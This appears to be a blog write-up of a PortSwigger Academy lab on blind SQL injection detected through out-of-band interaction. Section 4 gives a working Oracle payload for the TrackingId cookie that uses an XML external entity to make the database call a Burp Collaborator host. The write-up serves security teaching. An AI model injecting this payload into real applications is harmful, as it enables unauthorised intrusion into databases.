---
slug: "ps-sqli-16"
title: "Blind SQL injection with out of band interaction"
platform: "PortSwigger"
difficulty: "Hard"
category: ["Web","SQLi"]
date: "2025-12-23"
minutes: 4
visible: true
tldr: "blind SQL injection vulnerability — solved and documented end to end."
format: "html"
---

<p class="mono lab-crumb">PORTSWIGGER ACADEMY // SQLi SERIES &middot; LAB 16 &middot; <a href="https://github.com/0xWalid/Learnings/tree/main/Portswiggers/01-Sql%20Injection%20Labs/16-%20Blind%20SQL%20injection%20with%20out-of-band%20interaction.md" target="_blank" rel="noopener">original notes &#8599;</a></p>
<p>Identify and exploit a <strong>blind SQL injection vulnerability</strong> where:</p>
<ul><li>No SQL errors are returned</li><li>No response content changes</li><li>No time-based delays work</li></ul>
<p>and confirm exploitation by forcing the <strong>database to initiate an external (out-of-band) interaction</strong> using Burp Collaborator.</p>
<h2>1. Initial Recon &amp; Failure of Standard Techniques</h2>
<h2>Parameters Tested</h2>
<ul><li>URL parameters</li><li>POST body parameters</li><li>Cookie parameter: <code>TrackingId</code></li></ul>
<h2>Observations</h2>
<ul><li>Injecting a single quote (<code>'</code>) into all parameters caused <strong>no errors</strong></li><li>Boolean-based payloads produced <strong>no response differences</strong></li><li>Time-based payloads (<code>pg_sleep</code>, <code>sleep</code>, etc.) showed <strong>no delay</strong></li></ul>
<p>At this stage, <strong>all traditional blind SQLi techniques failed</strong>.</p>
<h2>Critical Observation (Why This Matters)</h2>
<p>The absence of errors, delays, or response differences does NOT mean the application is secure.</p>
<p>This is exactly the scenario where many testers give up — and that’s how real vulnerabilities slip through.</p>
<h2>2. Mindset Shift: Stop Listening to the App</h2>
<p>When the application is silent, you must force the database to communicate with you through the network.</p>
<p>Key realization:</p>
<ul><li>The application is no longer your feedback channel</li><li>DNS / HTTP interactions become your <strong>oracle</strong></li><li>If the database can reach the internet, you can confirm SQL execution <strong>without seeing anything on the page</strong></li></ul>
<p>This is the core idea behind <strong>out-of-band (OAST) SQL injection</strong>.</p>
<h2>3. Database Fingerprinting Strategy</h2>
<p>Since the backend database was unknown, payloads were tested for <strong>multiple DBMS types</strong>, starting with Oracle.</p>
<p>Oracle is a prime candidate because:</p>
<ul><li>It supports XML parsing inside SQL</li><li>It allows external entity resolution</li><li>It requires the <code>dual</code> table</li></ul>
<h2>4. Exploitation Payload (Oracle)</h2>
<p>The following payload was injected into the <strong>TrackingId cookie parameter</strong> (URL-encoded in the actual request):</p>
<pre class="code" data-lang="sql"><code>'|| (SELECT EXTRACTVALUE(
    xmltype(
      '&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE root [
&lt;!ENTITY% remoteSYSTEM "http://&lt;BURP-COLLABORATOR&gt;"&gt;
%remote;
       ]&gt;'
    ),
    '/l'
) FROM dual) --</code></pre>
<h2>Why This Payload Works (Important)</h2>
<ul><li><code>xmltype()</code> parses XML inside the database</li><li><code>EXTRACTVALUE()</code> forces evaluation</li><li>External entity resolution causes the database to make an outbound request</li><li><code>FROM dual</code> confirms Oracle-specific syntax</li><li>The application never needs to return anything</li></ul>
<p>This is pure <strong>out-of-band confirmation</strong>. Silent app, loud database. Beautiful as fuck.</p>
<h2>5. Confirmation via Burp Collaborator</h2>
<h2>Result</h2>
<ul><li>A DNS / HTTP interaction appeared in Burp Collaborator</li><li>The interaction originated from the target server</li><li>No change occurred in the HTTP response</li><li>No delay was observed in the browser</li></ul>
<h2>What This Confirms</h2>
<ul><li>SQL injection exists</li><li>User input is executed by the database</li><li>The backend DBMS is <strong>Oracle</strong></li><li>The database can initiate external network connections</li></ul>
<p>That’s game over.</p>
<h2>6. Final Outcome</h2>
<ul><li>Vulnerability successfully identified</li><li>Out-of-band SQL injection confirmed</li><li>Lab marked as <strong>Solved</strong></li><li>&lt;img width="1419" height="268" alt="image" src="https://github.com/user-attachments/assets/c8d64f62-1b53-40e6-8587-f7f70a13e857" /&gt;</li></ul>
<p>No guessing. No assumptions. Just hard confirmation.</p>
<h2>7. Key Takeaways (For Future You)</h2>
<ul><li>No output ≠ no SQL injection</li><li>If boolean and time-based fail, <strong>switch to OAST</strong></li><li>Always test:</li><li>XML</li><li>DNS</li><li>HTTP callbacks</li><li>Burp Collaborator is not optional — it’s mandatory on hardened targets</li></ul>
<p>If you don’t test out-of-band interaction, you will miss real-world SQL injection. Period.</p>

<details class="flag-box"><summary><span class="flag-label">LAB STATUS</span><span class="flag-hint"></span></summary><code>SQLi SERIES :: LAB 16 COMPLETE</code></details>
